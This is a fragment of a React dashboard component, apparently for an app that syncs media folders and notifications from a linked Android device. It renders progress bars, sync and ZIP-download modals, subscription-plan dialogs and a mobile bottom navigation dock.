                                        <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                                        Security Status
                                    </h4>
                                    <p className="text-xs text-white/60 mb-2">
                                        Device linking is secured via a unique UUID burned into the APK. Only this account can control the device.
                                    </p>
                                    <div className="flex items-center justify-between text-xs bg-black/20 p-2 rounded">
                                        <span className="text-white/40">Encryption</span>
                                        <span className="text-green-400">AES-256 / SSL</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {/* Sync Starting Overlay */}
                {isStartingSync && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl flex flex-col items-center animate-scaleUp">
                            <div className="w-10 h-10 border-4 border-purple-500/30 border-t-purple-500 rounded-full animate-spin mb-4" />
                            <h4 className="text-lg font-bold">Initiating sync...</h4>
                            <p className="text-white/40 text-sm">Please wait while we connect to device</p>
                        </div>
                    </div>
                )}
                {/* Progress Bar */}
                {uploadProgress && (
                    <div className="fixed bottom-6 right-6 bg-[#1a1a1a] border border-white/20 p-4 rounded-xl shadow-2xl w-80 animate-slideUp z-50">
                       <h4 className="text-sm font-bold mb-3 flex justify-between">
                            <span>Syncing {uploadProgress.folder}...</span>
                            <span className="text-purple-400 font-mono bg-purple-500/10 px-2 py-0.5 rounded text-xs">{Math.round((uploadProgress.uploaded / uploadProgress.total) * 100)}%</span>
                        </h4>
                        <div className="h-1.5 bg-white/10 rounded-full overflow-hidden mb-3 shadow-inner">
                            <div className="h-full bg-gradient-to-r from-purple-500 to-blue-500 transition-all duration-300 relative" style={{ width: `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` }}>
                                <div className="absolute top-0 right-0 bottom-0 w-4 bg-white/20 blur-sm mix-blend-overlay"></div>
                            </div>
                        </div>
                        <div className="flex justify-between items-center mt-1">
                            <button
                                onClick={() => {
                                    if (socket) socket.emit('stop_sync');
                                    setUploadProgress(null);
                                }}
                                className="text-[11px] font-bold tracking-wider text-red-500 bg-red-500/10 hover:bg-red-500/20 px-3 py-1.5 rounded-lg border border-red-500/20 transition-all flex items-center gap-1.5 hover:scale-[1.02]"
                            >
                                <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse shadow-[0_0_8px_rgba(239,68,68,0.8)]"></div>
                                STOP SYNC
                            </button>
                            <p className="text-[11px] font-mono text-white/40 bg-white/5 py-1 px-2 rounded-lg border border-white/5">
                                {uploadProgress.uploaded} <span className="text-white/20">/</span> {uploadProgress.total} items
                            </p>
                        </div>
                    </div>
                )}

                {/* Upgrade Modal */}
                <UpgradeModal
                    isOpen={showUpgradeModal}
                    onClose={() => setShowUpgradeModal(false)}
                    feature={upgradeFeature}
                    requiredPlan={requiredPlan}
                />

                {/* Plans Modal */}
                <PlansModal
                    isOpen={showPlansModal}
                    onClose={() => setShowPlansModal(false)}
                    currentPlan={userPlan}
                    userEmail={session?.user?.email || ''}
                    userUuid={session?.user?.uuid || ''}
                />

                {/* Bulk Download Modal (Premium) */}
                <BulkDownloadModal
                    isOpen={showBulkDownloadModal}
                    onClose={() => setShowBulkDownloadModal(false)}
                    folderName={bulkDownloadFolder}
                    userPlan={userPlan}
                    userUuid={session?.user?.uuid || ''}
                    onSuccess={(msg) => console.log('Bulk download:', msg)}
                />

                {/* Sync Options Modal (ZIP vs One-by-One) */}
                <SyncOptionsModal
                    isOpen={showSyncOptionsModal}
                    onClose={() => setShowSyncOptionsModal(false)}
                    folderName={syncOptionsFolder.name}
                    mediaType={syncOptionsFolder.type}
                    itemCount={syncOptionsFolder.count}
                    onSelectOneByOne={(count) => {
                        // Trigger normal sync
                        socket?.emit('trigger_sync', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            count,
                            mediaType: syncOptionsFolder.type
                        });
                    }}
                    onSelectZip={() => {
                        // Trigger ZIP download
                        setZipProgress({ stage: 'creating', current: 0, total: syncOptionsFolder.count, url: '', error: '' });
                        setShowZipProgressModal(true);
                        socket?.emit('trigger_zip', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            mediaType: syncOptionsFolder.type
                        });
                    }}
                    userPlan={userPlan}
                    onUpgrade={() => setShowPlansModal(true)}
                />

                {/* ZIP Progress Modal */}
                <ZipProgressModal
                    isOpen={showZipProgressModal}
                    onClose={() => setShowZipProgressModal(false)}
                    stage={zipProgress.stage}
                    current={zipProgress.current}
                    total={zipProgress.total}
                    folderName={syncOptionsFolder.name}
                    downloadUrl={zipProgress.url}
                    error={zipProgress.error}
                />

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>

            {/* ── Bottom App Dock (Mobile Only) ── */}
            <div className="sm:hidden fixed bottom-4 left-1/2 -translate-x-1/2 z-[400] w-[92%] max-w-sm glass-strong rounded-[2rem] px-2 py-2 flex items-center justify-around animate-slideInBottom">
                {/* Device */}
                <button
                    onClick={() => { setIsDeviceDropdownOpen(true); setIsToolDropdownOpen(false); setIsSettingsOpen(false); }}
                    className="dock-item"
                >
                    <div className="relative">
                        <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.6" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                        <div className={`absolute -top-0.5 -right-0.5 w-2 h-2 rounded-full ${onlineDeviceCount > 0 ? 'bg-emerald-400 shadow-[0_0_6px_rgba(52,211,153,0.6)]' : 'bg-rose-400'}`} />
                    </div>
                    <span>Device</span>
                </button>

                {/* Active Tool Dynamic Button */}
                <button
                    onClick={() => {
                        // Tapping the active tool re-opens the tools selector list
                        setIsToolDropdownOpen(true);
                    }}
                    className={`dock-item dock-item-active`}
                >
                    {toolDetails[selectedTool]?.icon || toolDetails.gallery.icon}
                    <span>{toolDetails[selectedTool]?.label || 'Gallery'}</span>
                    <div className="dock-indicator" />
                </button>
                {/* Tools FAB (Center) */}
                <button
                    onClick={() => { setIsToolDropdownOpen(true); setIsDeviceDropdownOpen(false); setIsSettingsOpen(false); }}
                    className="flex items-center justify-center w-14 h-14 rounded-full bg-gradient-to-tr from-indigo-500 to-violet-500 shadow-[0_4px_20px_rgba(99,102,241,0.4)] text-white -mt-5 border-[3px] border-black active:scale-90 transition-transform"
                >
                    <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" />
                    </svg>
                </button>

                {/* Notifications */}
                <button
                    onClick={() => { setSelectedTool('notifications'); setIsToolDropdownOpen(false); }}
                    className={`dock-item ${selectedTool === 'notifications' ? 'dock-item-active' : ''}`}
                >
                    <div className="relative">
                        <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.6" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                        {notifications.length > 0 && (
                            <span className="absolute -top-1 -right-1.5 min-w-[14px] h-[14px] rounded-full bg-rose-500 text-[8px] font-bold text-white flex items-center justify-center px-0.5">
                                {notifications.length > 99 ? '99+' : notifications.length}
                            </span>
                        )}
                    </div>
                    <span>Alerts</span>
                    {selectedTool === 'notifications' && <div className="dock-indicator" />}
                </button>

                {/* Settings */}
                <button
                    onClick={() => { setIsSettingsOpen(true); setIsToolDropdownOpen(false); setIsDeviceDropdownOpen(false); }}
                    className="dock-item"
                >
                    <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.6" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.6" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                    <span>Settings</span>
                </button>
            </div>
        </main>
    );
}
